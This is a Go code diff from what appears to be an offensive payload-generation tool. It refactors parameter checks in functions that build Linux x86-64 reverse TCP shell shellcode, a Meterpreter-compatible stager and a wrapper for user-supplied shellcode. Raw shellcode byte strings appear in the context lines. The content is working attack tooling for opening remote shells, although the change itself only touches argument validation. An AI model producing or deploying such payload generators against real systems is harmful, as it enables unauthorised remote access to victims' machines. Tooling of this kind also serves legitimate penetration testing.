@@ -12,9 +12,13 @@ func init() {
 }
 
 func reverse_tcp_shell_linux_intel_64(params api.Parameters) ([]byte, error) {
+
+	if err := params.Require([]api.ParamType{api.Port, api.Entry64, api.IP}); err != nil {
+		return nil, err
+	}
 	port := params.Port
 	entry := params.Entry64
-	ip := params.Ip
+	ip := params.IP
 
 	//64bit shellcode
 	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
@@ -43,9 +47,13 @@ func reverse_tcp_shell_linux_intel_64(params api.Parameters) ([]byte, error) {
 }
 
 func reverse_tcp_stager_linux_intel_64(params api.Parameters) ([]byte, error) {
+
+	if err := params.Require([]api.ParamType{api.Port, api.Entry64, api.IP}); err != nil {
+		return nil, err
+	}
 	port := params.Port
 	entry := params.Entry64
-	ip := params.Ip
+	ip := params.IP
 
 	/*
 	   FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
@@ -78,8 +86,11 @@ func reverse_tcp_stager_linux_intel_64(params api.Parameters) ([]byte, error) {
 }
 
 func user_shellcode_linux_intel_64(params api.Parameters) ([]byte, error) {
+
+	if err := params.Require([]api.ParamType{api.Port, api.ShellCode}); err != nil {
+		return nil, err
+	}
 	entry := params.Entry64
-	supplied_shellcode := params.ShellCode
 
 	//64bit shellcode
 	shellcode1 := "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x0c"
@@ -92,7 +103,7 @@ func user_shellcode_linux_intel_64(params api.Parameters) ([]byte, error) {
 	shellcode1 += "\xff\xe5"
 
 	//SHELLCODE
-	shellcode1 += string(supplied_shellcode)
+	shellcode1 += string(params.ShellCode)
 
 	return []byte(shellcode1), nil
 }
